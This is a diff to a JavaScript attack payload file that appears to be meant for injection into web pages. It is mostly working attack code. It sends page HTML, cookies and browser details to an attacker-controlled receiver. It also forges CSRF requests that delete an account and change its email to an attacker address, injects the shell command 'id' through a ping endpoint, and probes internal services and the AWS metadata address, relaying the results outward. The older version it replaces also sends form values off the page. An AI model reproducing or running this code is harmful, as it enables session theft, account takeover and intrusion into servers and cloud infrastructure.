@@ -1,86 +1,125 @@
-// payloads.js
-// Collection of DOM-aware client-side data transmission routines
-// Intended for use in conjunction with a passive decoding receiver
+// payloads___
+//
+//
 
 (function () {
-  const TARGET = "http://192.168.1.221:8080"; // <-- Update to your receiver
+  const TARGET = "http://192.168.1.221:8080"; // ← Your receiver
+  const ORIGIN = location.origin;
 
-  // Helper: send as base64 via POST
-  function postData(encodedPayload, endpoint = "") {
+  function postData(encoded, path = "") {
     try {
       const xhr = new XMLHttpRequest();
-      xhr.open("POST", `${TARGET}${endpoint}`, true);
+      xhr.open("POST", `${TARGET}${path}`, true);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr.send("data=" + encodeURIComponent(encodedPayload));
-    } catch (e) {
-      console.warn("Transmission failed");
-    }
+      xhr.send("data=" + encodeURIComponent(encoded));
+    } catch (e) {}
   }
 
-  // 1. DOM snapshot
+  function sendRaw(data, path = "") {
+    postData(btoa(data), path);
+  }
+
+  // 1. DOM Preview
+  sendRaw(document.documentElement.outerHTML.slice(0, 2048), "/dom");
+
+  // 2. Cookie + Env
+  sendRaw(document.cookie + " | " + navigator.userAgent, "/meta");
+
+  // 3. Light CSRF (GET request with no response)
   try {
-    const dom = document.documentElement.outerHTML;
-    postData(btoa(dom));
+    const img = new Image();
+    img.src = `${ORIGIN}/account/delete?id=1234`;
   } catch (_) {}
 
-  // 2. Focused inner section
+  // 4. CSRF via POST (auto-submit form technique)
   try {
-    const section = document.querySelector("main")?.innerHTML || "";
-    postData(btoa(section), "/section");
+    const f = document.createElement("form");
+    f.method = "POST";
+    f.action = `${ORIGIN}/account/change-email`;
+    const i = document.createElement("input");
+    i.name = "email";
+    i.value = "admin@attacker.test";
+    f.appendChild(i);
+    document.body.appendChild(f);
+    f.submit();
   } catch (_) {}
 
-  // 3. Local environment details
+  // 5. Attempt light command injection via POST
   try {
-    const env = navigator.userAgent + " | " + screen.width + "x" + screen.height + " | " + location.href;
-    postData(btoa(env), "/env");
+    const payload = { host: "127.0.0.1; id" }; // benign command for testing
+    const r = new XMLHttpRequest();
+    r.open("POST", `${ORIGIN}/api/ping`, true);
+    r.setRequestHeader("Content-Type", "application/json");
+    r.onload = function () {
+      sendRaw("cmd result: " + this.responseText, "/cmd");
+    };
+    r.onerror = function () {
+      sendRaw("cmd request failed", "/cmd-error");
+    };
+    r.send(JSON.stringify(payload));
   } catch (_) {}
 
-  // 4. Active form data (shallow)
+  // 6. SSRF to known local endpoint
   try {
-    const forms = Array.from(document.forms).map(f => {
-      return Array.from(f.elements)
-        .map(el => `${el.name}=${el.value}`)
-        .join("&");
+    fetch(`${ORIGIN}/api/internal/config`)
+      .then(r => r.text())
+      .then(t => sendRaw("internal config: " + t.slice(0, 512), "/config"))
+      .catch(() => {});
+  } catch (_) {}
+
+  // 7. Timing attack / delay profiling
+  try {
+    const t1 = performance.now();
+    fetch(`${ORIGIN}/healthz?debug=1`).then(() => {
+      const delta = performance.now() - t1;
+      sendRaw("delta=" + delta.toFixed(2), "/timing");
     });
-    postData(btoa(forms.join("\n")), "/forms");
   } catch (_) {}
 
-  // 5. Dynamic script inventory
+  // 8. Iframe force-load (possible CSRF)
   try {
-    const scripts = Array.from(document.scripts).map(s => s.src || "[inline]").join("\n");
-    postData(btoa(scripts), "/scripts");
+    const i = document.createElement("iframe");
+    i.style.display = "none";
+    i.src = `${ORIGIN}/admin/refresh`;
+    document.body.appendChild(i);
   } catch (_) {}
 
-  // 6. Simple text content
-  try {
-    const txt = document.body?.innerText?.slice(0, 1024) || "";
-    postData(btoa(txt), "/text");
-  } catch (_) {}
+  // 9. Service list ping
+  const internalHosts = [
+    "http://localhost:8000/status",
+    "http://127.0.0.1:5000/debug",
+    "http://169.254.169.254/latest/meta-data/hostname", // AWS metadata
+  ];
 
-  // 7. Frame count + titles
-  try {
-    const frames = window.frames.length;
-    const titles = Array.from(document.querySelectorAll("iframe")).map(f => f.title).join(",");
-    postData(btoa(`frames=${frames}, titles=${titles}`), "/frames");
-  } catch (_) {}
-
-  // 8. Style and computed color details
-  try {
-    const sample = document.querySelector("body");
-    const color = sample ? getComputedStyle(sample).color : "unknown";
-    postData(btoa(`style: ${color}`), "/style");
-  } catch (_) {}
-
-  // 9. Script timing fingerprint
-  try {
-    const start = performance.timing.navigationStart;
-    const now = Date.now();
-    postData(btoa(`timeDelta=${now - start}`), "/timing");
-  } catch (_) {}
-
-  // 10. Passive error signal
-  window.addEventListener("error", function (e) {
-    postData(btoa("error=" + e.message), "/error");
+  internalHosts.forEach(url => {
+    try {
+      fetch(url)
+        .then(r => r.text())
+        .then(t => sendRaw("fetched " + url + ": " + t.slice(0, 128), "/ssrf"));
+    } catch (_) {}
   });
 
+  // 10. Beacon on error
+  window.addEventListener("error", function (e) {
+    sendRaw("client error: " + e.message, "/error");
+  });
+
+  // 11. Async blind POST trigger (for devops endpoints)
+  try {
+    fetch(`${ORIGIN}/api/refresh`, {
+      method: "POST",
+      headers: { "X-Trigger": "soft" },
+    });
+  } catch (_) {}
+
+  // 12. Screenshot DOM section over time
+  setTimeout(() => {
+    try {
+      const section = document.querySelector("main")?.outerHTML || "";
+      sendRaw("delayed view: " + section.slice(0, 1024), "/deferred");
+    } catch (_) {}
+  }, 3000);
+
 })();
+//
+//
